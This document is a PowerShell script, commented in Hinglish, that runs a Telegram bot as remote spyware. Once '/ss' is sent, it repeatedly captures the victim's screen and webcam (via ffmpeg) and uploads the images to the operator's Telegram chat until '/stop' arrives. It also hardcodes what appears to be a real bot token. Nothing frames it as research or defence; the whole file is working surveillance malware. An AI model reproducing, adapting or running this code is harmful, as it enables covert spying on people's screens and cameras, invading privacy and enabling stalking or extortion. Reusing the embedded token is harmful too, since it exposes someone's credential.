# Bot ka token BotFather se lekar yahan daalein
$BotToken = "7748489422:AAGrYJ8e0kwARBhxgR1gtf8b8zEKlgoNJQ8"
$BaseUrl = "https://api.telegram.org/bot$BotToken"

# User Chat ID store karne ke liye variable
$Global:ActiveChatID = $null
$Global:SendingPhotos = $false  # `/ss` ke baad photos bhejne ka control

# Screenshot lene ke liye function
Function Take-Screenshot {
    $ScreenshotPath = "$env:TEMP\screenshot.png"
    Add-Type -TypeDefinition @"
        using System.Drawing;
        using System.Windows.Forms;
        public class ScreenCapture {
            public static void Capture(string filePath) {
                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics g = Graphics.FromImage(bmp);
                g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                bmp.Save(filePath, System.Drawing.Imaging.ImageFormat.Png);
                g.Dispose();
                bmp.Dispose();
            }
        }
"@ -Language CSharp

    [ScreenCapture]::Capture($ScreenshotPath)
    return $ScreenshotPath
}

# Webcam photo lene ke liye function (ffmpeg required)
Function Take-WebcamPhoto {
    $WebcamPath = "$env:TEMP\webcam.jpg"
    Start-Process -NoNewWindow -FilePath "ffmpeg" -ArgumentList "-f dshow -i video=`"Integrated Camera`" -frames:v 1 `"$WebcamPath`" -y" -Wait
    return $WebcamPath
}

# Telegram pe photo bhejne ke liye function
Function Send-TelegramPhoto {
    param (
        [string]$ChatID,
        [string]$PhotoPath
    )

    $SendPhotoUrl = "$BaseUrl/sendPhoto"
    $Form = @{
        chat_id = $ChatID
        photo   = Get-Item -Path $PhotoPath
    }

    try {
        Invoke-RestMethod -Uri $SendPhotoUrl -Method Post -Form $Form
    } catch {
        Write-Error "Photo bhejne mein error aayi: $_"
    }
}

# `/ss` receive hone par loop me photos bhejta rahega
Function Start-PhotoLoop {
    param ([string]$ChatID)
    $Global:SendingPhotos = $true
    while ($Global:SendingPhotos) {
        $Screenshot = Take-Screenshot
        $WebcamPhoto = Take-WebcamPhoto
        Send-TelegramPhoto -ChatID $ChatID -PhotoPath $Screenshot
        Send-TelegramPhoto -ChatID $ChatID -PhotoPath $WebcamPhoto
        Start-Sleep -Seconds 1
    }
}

# Function jo Telegram se messages fetch kare
Function Start-BotListener {
    $Offset = 0

    while ($true) {
        $GetUpdatesUrl = "$BaseUrl/getUpdates?offset=$Offset"
        try {
            $Updates = Invoke-RestMethod -Uri $GetUpdatesUrl -Method Get
            foreach ($Update in $Updates.result) {
                $Offset = $Update.update_id + 1

                if ($Update.message -and $Update.message.text) {
                    $ChatID = $Update.message.chat.id
                    $Text = $Update.message.text.ToLower()

                    if ($Text -eq "/ss") {
                        $Global:ActiveChatID = $ChatID
                        Send-TelegramMessage -ChatID $ChatID -Message "📷 Screenshot aur webcam photos bhej raha hoon! `/stop` likhne par band ho jayega."
                        Start-PhotoLoop -ChatID $ChatID
                    }
                    elseif ($Text -eq "/stop") {
                        $Global:SendingPhotos = $false
                        Send-TelegramMessage -ChatID $ChatID -Message "🚫 Photos bhejna band kar diya."
                    }
                }
            }
        } catch {
            Write-Error "Updates lene mein error aayi: $_"
        }

       Start-Sleep -Seconds 1
    }
}

# Message bhejne ke liye function
Function Send-TelegramMessage {
    param (
        [string]$ChatID,
        [string]$Message
    )

    $SendMessageUrl = "$BaseUrl/sendMessage"
    $Body = @{
        chat_id = $ChatID
        text    = $Message
    }

    try {
        Invoke-RestMethod -Uri $SendMessageUrl -Method Post -ContentType "application/json" -Body ($Body | ConvertTo-Json -Depth 10)
    } catch {
        Write-Error "Message bhejne mein error aayi: $_"
    }
}

# Bot Listener start karo
Start-BotListener
